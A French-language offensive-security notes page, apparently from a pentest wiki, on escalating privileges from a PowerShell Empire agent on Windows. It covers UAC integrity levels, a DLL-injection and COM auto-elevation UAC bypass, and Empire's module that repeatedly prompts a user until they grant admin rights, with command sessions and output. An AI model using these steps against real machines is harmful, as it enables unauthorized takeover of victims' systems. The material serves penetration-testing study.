
A partir de **Windows Vista**, le concept d'**UAC** (User Account Control) à été introduit ce qui permet au process d'avoir **3 niveaux differents de permission** :

- **HIGH**: Droit **administrateur**
- **MEDIUM**: Droit d'**utilisateur** standard
- **LOW**: **Restreint** à certaines autorisations

# __High_integrity__

Pour avoir l'information sur les **permissions que nous avons** sur notre backdoor Empire, on execute la commande **[`info`](Powershell_empire#####Info)**. La ligne **high_integrity**, par defaut **False**, indique notre **niveau de permission**.

```shell
(Empire: GYRE59LF) > info

┌Agent Options─────┬───────────────────────────────────────────────┐
│ session_id       │ GYRE59LF                                      │
├──────────────────┼───────────────────────────────────────────────┤
(...)
├──────────────────┼───────────────────────────────────────────────┤
│ username         │ LAPTOP\User                                   │
├──────────────────┼───────────────────────────────────────────────┤
│ high_integrity   │ False                                         │
├──────────────────┼───────────────────────────────────────────────┤
│ process_id       │ 12828                                         │
├──────────────────┼───────────────────────────────────────────────┤
(...)
```

# __Windows 7__

## __Techniques__

Sous Windows 7, il existe plusieurs méthode pour **escalader nos privilège** :

- **Exploit d'une vulnerabilité** applicative ou système
- Faire exécuter une action en **trompant un administrateur**
- Trouver une **DB** locale de **password**
- Réutiliser des **identifiants déjà trouvés** sur une autre machine du réseau
- ...


## __Bypass UAC__

### Working

#### 1st

Certains **objets COM** ont la capacité d'**élever leurs permissions** lorsqu'ils sont appelés **depuis un programme signé** par un certificat *code signing* Microsoft.

Pour les programmes non signés, il est possible d'**injecter une dll dans un programme signé** (calc.exe par exemple). Cette dll peut donc **appeler un objet COM** qui effectuera une **auto-élévation**. 

#### 2nd

Une fois cela fait, on doit passer d'une copie de fichier à une exécution de code. Pour cela, certains programmes de Windows peuvent s'auto-elever sans notification (*sysrep* par exemple).

### Usage

Il est donc possible sur notre client windows 7 de passer administrateur avec la **commande `bypassuac`**


# __Windows 10__

## __Ask__

Une technique consiste simplement à demander à l'utilisateur en boucle jusqu'à ce qu'il accepte.

Pour cela on va utiliser le module `powershell_privesc_ask`.

```shell
(Empire: 9UPHL3C1) > usemodule powershell_privesc_ask
INFO: Set Agent to 9UPHL3C1 

 id           powershell_privesc_ask                                                 
 authors      Jack64, ,                                                              
 description  Leverages Start-Process -Verb runAs option inside a YES-Required loop 
              to prompt the user for a high integrity context before running the     
              agent code. UAC will report Powershell is requesting Administrator     
              privileges. Because this does not use the BypassUAC DLLs, it should    
              not trigger any AV alerts.                                             
 background   True                                                                   
 language     powershell                                                             
 needs_admin  False                                                                  
 opsec_safe   False                                                                  
 techniques   http://attack.mitre.org/techniques/T1088                               
 comments     https://github.com/rapid7/metasploit-                                  
              framework/blob/master/modules/exploits/windows/local/ask.rb            


┌Record Options────┬────────────────────┬──────────┬─────────────────────────────────────┐
│ Name             │ Value              │ Required │ Description                         │
├──────────────────┼────────────────────┼──────────┼─────────────────────────────────────┤
│ Agent            │ 9UPHL3C1           │ True     │ Agent to run module on.             │
├──────────────────┼────────────────────┼──────────┼─────────────────────────────────────┤
│ Listener         │                    │ True     │ Listener to use.                    │
├──────────────────┼────────────────────┼──────────┼─────────────────────────────────────┤
│ Obfuscate        │ False              │ False    │ Switch. Obfuscate the launcher      │
│                  │                    │          │ powershell code, uses the           │
│                  │                    │          │ ObfuscateCommand for obfuscation    │
│                  │                    │          │ types. For powershell only.         │
├──────────────────┼────────────────────┼──────────┼─────────────────────────────────────┤
│ ObfuscateCommand │ Token\All\1        │ False    │ The Invoke-Obfuscation command to   │
│                  │                    │          │ use. Only used if Obfuscate switch  │
│                  │                    │          │ is True. For powershell only.       │
├──────────────────┼────────────────────┼──────────┼─────────────────────────────────────┤
│ Bypasses         │ mattifestation etw │ False    │ Bypasses as a space separated list  │
│                  │                    │          │ to be prepended to the launcher.    │
├──────────────────┼────────────────────┼──────────┼─────────────────────────────────────┤
│ UserAgent        │ default            │ False    │ User-agent string to use for the    │
│                  │                    │          │ staging request (default, none, or  │
│                  │                    │          │ other).                             │
├──────────────────┼────────────────────┼──────────┼─────────────────────────────────────┤
│ Proxy            │ default            │ False    │ Proxy to use for request (default,  │
│                  │                    │          │ none, or other).                    │
├──────────────────┼────────────────────┼──────────┼─────────────────────────────────────┤
│ ProxyCreds       │ default            │ False    │ Proxy credentials                   │
│                  │                    │          │ ([domain\]username:password) to use │
│                  │                    │          │ for request (default, none, or      │
│                  │                    │          │ other).                             │
└──────────────────┴────────────────────┴──────────┴─────────────────────────────────────┘

(Empire: usemodule/powershell_privesc_ask) > set Listener http
INFO: Set Listener to http
(Empire: usemodule/powershell_privesc_ask) > generate
INFO: Tasked 9UPHL3C1 to run Task 2 
[*] Task 2 results received
Job started: BY5RXL
```

Puis lorsque la cible validera :

```shell
[*] Task 2 results received
[*] Successfully elevated!

[+] New agent FEXA5RKZ checked in
```

